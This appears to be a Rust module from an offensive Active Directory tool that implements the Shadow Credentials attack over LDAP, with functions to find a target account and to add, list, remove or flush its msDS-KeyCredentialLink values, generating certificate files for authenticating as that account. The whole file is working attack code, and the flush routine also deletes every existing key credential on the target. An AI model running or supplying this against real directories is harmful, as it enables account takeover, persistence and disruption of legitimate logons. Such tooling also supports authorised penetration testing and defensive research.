//! Shadow Credentials over LDAP: add / list / remove / flush
//! `msDS-KeyCredentialLink`. Payload building lives in `actions::common::keycred`.

use std::collections::HashSet;

use anyhow::{anyhow, Result};
use ldap3::{Ldap, Mod, Scope, SearchEntry};
use log::{debug, info};

use crate::actions::common::{base_dn, keycred};
use crate::actions::common::keycred::KEYCRED_ATTR;
use crate::args::Options;

/// Resolve a sAMAccountName (or CN, with/without trailing `$`) to its DN.
async fn find_target_dn(ldap: &mut Ldap, base: &str, sam: &str) -> Result<String> {
    let dollar = format!("{sam}$");
    let filter = format!(
        "(|(sAMAccountName={})(sAMAccountName={})(cn={}))",
        ldap3::ldap_escape(sam),
        ldap3::ldap_escape(&dollar),
        ldap3::ldap_escape(sam),
    );
    let (rs, _) = ldap.search(base, Scope::Subtree, &filter, vec!["dn"]).await?.success()?;
    let entry = rs.into_iter().next().ok_or_else(|| anyhow!("object '{sam}' not found"))?;
    Ok(SearchEntry::construct(entry).dn)
}

/// Read every `msDS-KeyCredentialLink` value (DNWithBinary is ASCII text, so
/// values returned as raw bytes are read lossily too).
async fn read_keycred_values(ldap: &mut Ldap, target_dn: &str) -> Result<Vec<String>> {
    let (rs, _) = ldap
        .search(target_dn, Scope::Base, "(objectClass=*)", vec![KEYCRED_ATTR])
        .await?
        .success()?;
    let entry = rs.into_iter().next().ok_or_else(|| anyhow!("could not read target object"))?;
    let se = SearchEntry::construct(entry);
    let mut vals: Vec<String> = se.attrs.get(KEYCRED_ATTR).cloned().unwrap_or_default();
    if let Some(bin) = se.bin_attrs.get(KEYCRED_ATTR) {
        for b in bin {
            vals.push(String::from_utf8_lossy(b).into_owned());
        }
    }
    Ok(vals)
}

pub async fn list(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base = base_dn(&opts.domain);
    let dn = find_target_dn(ldap, &base, target).await?;
    let values = read_keycred_values(ldap, &dn).await?;
    keycred::print_list(target, &values);
    Ok(())
}

pub async fn add(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base = base_dn(&opts.domain);
    let dn = find_target_dn(ldap, &base, target).await?;

    let m = keycred::generate(target, &dn, &opts.domain)?;

    debug!("[shadow_cred] writing {KEYCRED_ATTR} on {dn}");
    ldap.modify(&dn, vec![Mod::Add(KEYCRED_ATTR.as_bytes().to_vec(), HashSet::from([m.value.clone().into_bytes()]))])
        .await?
        .success()
        .map_err(|e| anyhow!("add_shadow_cred LDAP modify failed: {e}"))?;

    info!("Shadow credential added to '{target}'");
    info!("    DeviceID: {}", keycred::format_device_guid(&m.device_id));
    keycred::write_cert_files_and_hint(target, &opts.domain, &m)?;
    Ok(())
}

pub async fn remove(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let key_id = opts
        .shadow_key_id
        .as_deref()
        .ok_or_else(|| anyhow!("--shadow-key-id required (DeviceID from list_shadow_cred)"))?;
    let wanted = keycred::parse_device_guid(key_id)
        .ok_or_else(|| anyhow!("invalid DeviceID '{key_id}': expected GUID or 32 hex chars"))?;

    let base = base_dn(&opts.domain);
    let dn = find_target_dn(ldap, &base, target).await?;
    let values = read_keycred_values(ldap, &dn).await?;
    if values.is_empty() {
        info!("No shadow credentials on '{target}', nothing to remove");
        return Ok(());
    }

    let (keep, removed): (Vec<_>, Vec<_>) = values.iter().partition(|v| {
        keycred::parse_dnwithbinary(v).map(|kc| kc.device_id != wanted).unwrap_or(true)
    });
    if removed.is_empty() {
        return Err(anyhow!("DeviceID '{key_id}' not found on '{target}' (run list_shadow_cred)"));
    }

    let kept: HashSet<Vec<u8>> = keep.into_iter().map(|v| v.as_bytes().to_vec()).collect();
    ldap.modify(&dn, vec![Mod::Replace(KEYCRED_ATTR.as_bytes().to_vec(), kept)])
        .await?
        .success()
        .map_err(|e| anyhow!("remove_shadow_cred LDAP modify failed: {e}"))?;
    info!("Shadow credential '{key_id}' removed from '{target}'");
    Ok(())
}

pub async fn flush(ldap: &mut Ldap, opts: &Options) -> Result<()> {
    let target = opts.shadow_target.as_deref().ok_or_else(|| anyhow!("--shadow-target required"))?;
    let base = base_dn(&opts.domain);
    let dn = find_target_dn(ldap, &base, target).await?;
    ldap.modify(&dn, vec![Mod::Replace(KEYCRED_ATTR.as_bytes().to_vec(), HashSet::<Vec<u8>>::new())])
        .await?
        .success()
        .map_err(|e| anyhow!("flush_shadow_cred LDAP modify failed: {e}"))?;
    info!("All shadow credentials cleared from '{target}'");
    Ok(())
}